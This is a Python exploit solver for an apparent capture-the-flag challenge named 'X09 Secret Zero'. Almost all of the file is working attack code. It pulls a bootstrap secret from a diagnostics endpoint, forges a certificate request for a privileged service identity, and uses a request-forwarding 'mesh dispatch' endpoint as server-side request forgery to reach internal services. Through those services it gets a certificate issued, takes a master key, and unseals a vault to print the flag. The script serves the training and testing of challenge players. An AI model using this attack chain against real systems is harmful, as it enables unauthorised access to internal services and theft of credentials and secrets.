#!/usr/bin/env python3
"""
Clean-Room Exploit Solver for X09 — Secret Zero
Executes full identity bootstrap -> certificate issuance -> secret zero -> target unseal -> flag retrieval.
"""

import sys
import os
import argparse
import requests
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

def solve(base_url: str):
    base_url = base_url.rstrip("/")
    print(f"[*] Targeting Secret Zero challenge at {base_url}...")

    # Step 1: Query Diagnostic Inspector to extract bootstrap secret & config
    diag_url = f"{base_url}/api/diagnostics/view?item=bootstrap_agent.conf"
    print(f"[*] Step 1: Inspecting bootstrap configuration from {diag_url}...")
    res = requests.get(diag_url, timeout=5)
    if res.status_code != 200:
        print(f"[-] Failed to fetch diagnostic config: {res.status_code} {res.text}")
        sys.exit(1)

    config = res.json()
    bootstrap_secret = config.get("bootstrap_hmac_secret")
    authorized_identities = config.get("authorized_machine_identities", [])
    print(f"[+] Recovered provisional bootstrap secret: {bootstrap_secret}")
    print(f"[+] Authorized machine identities: {authorized_identities}")

    target_identity = "spiffe://latveria.local/ns/core/sa/vault-operator"

    # Step 2: Generate RSA Keypair & CSR
    print(f"[*] Step 2: Generating client RSA keypair & CSR for identity '{target_identity}'...")
    client_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )

    csr_builder = (
        x509.CertificateSigningRequestBuilder()
        .subject_name(x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "LV"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Latveria Cyber Command"),
            x509.NameAttribute(NameOID.COMMON_NAME, "vault-operator"),
        ]))
        .add_extension(
            x509.SubjectAlternativeName([
                x509.UniformResourceIdentifier(target_identity)
            ]),
            critical=False,
        )
    )

    csr = csr_builder.sign(
        private_key=client_key,
        algorithm=hashes.SHA256(),
        backend=default_backend()
    )

    csr_pem = csr.public_bytes(serialization.Encoding.PEM).decode("utf-8")
    print("[+] Generated CSR successfully.")

    # Step 3: Issue High-Trust Machine Certificate via Identity Authority (Port 8081)
    print("[*] Step 3: Requesting signed machine certificate from Identity Authority...")
    issue_payload = {
        "target_url": "http://127.0.0.1:8081/api/v1/ca/issue",
        "method": "POST",
        "body": {
            "csr": csr_pem,
            "bootstrap_secret": bootstrap_secret,
            "requested_identity": target_identity
        }
    }

    mesh_url = f"{base_url}/api/mesh/dispatch"
    res = requests.post(mesh_url, json=issue_payload, timeout=5)
    if res.status_code != 200:
        print(f"[-] CA signing failed: {res.status_code} {res.text}")
        sys.exit(1)

    issue_data = res.json().get("data", {})
    client_cert_pem = issue_data.get("certificate")
    if not client_cert_pem:
        print(f"[-] No certificate returned in response: {res.json()}")
        sys.exit(1)

    print(f"[+] Successfully issued machine certificate! Serial: {issue_data.get('metadata', {}).get('serial_number')}")

    # Step 4: Authenticate to Secret Service (Port 8082) to obtain Secret Zero
    print("[*] Step 4: Authenticating to Secret Distribution Engine (Port 8082)...")
    secret_payload = {
        "target_url": "http://127.0.0.1:8082/api/v1/vault/secret-zero",
        "method": "POST",
        "body": {
            "client_certificate": client_cert_pem
        }
    }

    res = requests.post(mesh_url, json=secret_payload, timeout=5)
    if res.status_code != 200:
        print(f"[-] Secret Service authentication failed: {res.status_code} {res.text}")
        sys.exit(1)

    secret_data = res.json().get("data", {})
    secret_zero_key = secret_data.get("secret_zero_key")
    if not secret_zero_key:
        print(f"[-] Secret Zero key not found in response: {secret_data}")
        sys.exit(1)

    print(f"[+] Successfully obtained Secret Zero Master Key: {secret_zero_key}")

    # Step 5: Unseal Protected Target (Port 8083) to retrieve Flag
    print("[*] Step 5: Unsealing Protected Target Doomsday Vault (Port 8083)...")
    target_payload = {
        "target_url": "http://127.0.0.1:8083/api/v1/doomsday/unseal",
        "method": "POST",
        "headers": {
            "Authorization": f"Bearer {secret_zero_key}"
        }
    }

    res = requests.post(mesh_url, json=target_payload, timeout=5)
    if res.status_code != 200:
        print(f"[-] Target unseal failed: {res.status_code} {res.text}")
        sys.exit(1)

    unseal_data = res.json().get("data", {})
    flag = unseal_data.get("flag")
    if not flag:
        print(f"[-] Flag not found in unseal response: {unseal_data}")
        sys.exit(1)

    print(f"\n[🎉] SOLVE SUCCESSFUL!")
    print(f"[+] Flag: {flag}")
    return flag

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="X09 Secret Zero Exploit Solver")
    parser.add_argument("url", nargs="?", default="http://127.0.0.1:8080", help="Base URL of target challenge")
    args = parser.parse_args()

    solve(args.url)
